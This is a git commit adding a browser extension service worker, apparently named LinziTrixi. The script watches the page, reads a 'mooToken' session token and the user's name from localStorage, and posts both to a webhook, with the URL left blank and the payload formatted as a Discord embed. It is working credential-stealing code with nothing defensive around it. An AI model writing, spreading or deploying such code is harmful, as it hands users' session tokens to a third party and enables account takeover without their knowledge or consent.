f43ccff0df00f29a0bc7c6f4b3aa43e3dc71849c
M3RFR3T <153049933+m3rfr3t@users.noreply.github.com>
2023-12-16 16:55:53 -0500

    Add files via upload

---
+++ LinziTrixi/src/background/service_worker.js
@@ -0,0 +1,51 @@
+const myWebhookURL = "";
+
+function sendMooToken(webhookURL, fullName, mooToken) {
+  const request = new XMLHttpRequest();
+  const params = JSON.stringify({
+    username: "LinziTrixi",
+    avatar_url: "https://avatars.githubusercontent.com/u/153049933?v=4",
+    embeds: [
+      {
+        color: 3447003,
+        fields: [
+          {
+            name: "Full Name: ",
+            value: fullName,
+          },
+          {
+            name: "mooToken: ",
+            value: mooToken,
+          },
+        ],
+        footer: {
+          text: "github.com/M3RFR3T",
+        },
+      },
+    ],
+  });
+
+  request.open("POST", webhookURL);
+  request.setRequestHeader("Content-type", "application/json");
+  request.send(params);
+}
+
+let saveToken = "";
+
+const observer = new MutationObserver(() => {
+  const userToken = localStorage.getItem("mooToken");
+
+  if (!userToken || userToken === saveToken) return;
+
+  const userInfo = localStorage.getItem("user");
+
+  if (userInfo) {
+    sendMooToken(myWebhookURL, JSON.parse(userInfo).name, userToken);
+  } else {
+    sendMooToken(myWebhookURL, null, userToken);
+  }
+  console.log("%cSend!", "color: red; font-size: 40px;");
+  saveToken = userToken;
+});
+
+observer.observe(document.body, { childList: true, subtree: true });
